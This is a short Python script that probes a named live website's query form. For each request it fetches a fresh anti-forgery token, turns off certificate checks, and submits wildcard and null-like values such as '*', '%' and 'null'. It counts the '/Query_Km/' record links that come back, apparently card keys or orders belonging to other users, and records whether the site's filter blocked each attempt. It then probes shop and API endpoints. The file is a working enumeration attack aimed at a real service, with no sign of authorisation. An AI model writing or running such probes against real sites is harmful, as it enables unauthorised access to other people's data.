#!/usr/bin/env python3
import json
import re

import requests

requests.packages.urllib3.disable_warnings()

base = "https://15118.cn"
s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": "Mozilla/5.0"})
TOKEN_RE = re.compile(
    r'name=["\']__token__["\'][^>]*value=["\']([^"\']+)["\']'
    r'|value=["\']([^"\']+)["\'][^>]*name=["\']__token__["\']'
)
KM_RE = re.compile(r"/Query_Km/([a-zA-Z0-9]+)")

out = []
for v in ["null", "NULL", "0", "", "1", "*", "%", "admin", "undefined"]:
    q = s.get(base + "/Query.html", timeout=15)
    tok = TOKEN_RE.search(q.text)
    if not tok:
        print("no token")
        break
    token = tok.group(1) or tok.group(2)
    p = s.post(
        base + "/Query.html",
        data={"value": v, "page": "1", "__token__": token},
        headers={"Referer": base + "/Query.html"},
        timeout=20,
    )
    kms = KM_RE.findall(p.text)
    row = {
        "v": v,
        "len": len(p.text),
        "kms": len(kms),
        "blocked": "非法" in p.text,
        "snip": p.text[:120].replace("\n", " "),
    }
    out.append(row)
    print(json.dumps(row, ensure_ascii=False))

# alt paths
for path in ["/shop/", "/shop/ajax.php?act=getcount", "/api.php"]:
    r = s.get(base + path, timeout=12)
    print(path, r.status_code, len(r.text), r.text[:80])
